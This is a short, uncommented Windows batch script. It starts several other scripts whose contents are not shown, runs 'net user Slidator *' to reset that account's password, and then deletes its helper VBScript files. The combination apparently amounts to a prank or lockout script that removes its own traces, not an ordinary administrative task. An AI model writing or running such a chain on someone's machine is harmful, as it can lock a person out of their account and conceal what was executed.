@echo off
start p.bat && timeout 2 && start t.vbs && timeout 3 && start j.vbs 
net user Slidator * && start m.vbs || start o.vbs & timeout 3 && del j.vbs && del t.vbs && del m.vbs && del o.vbs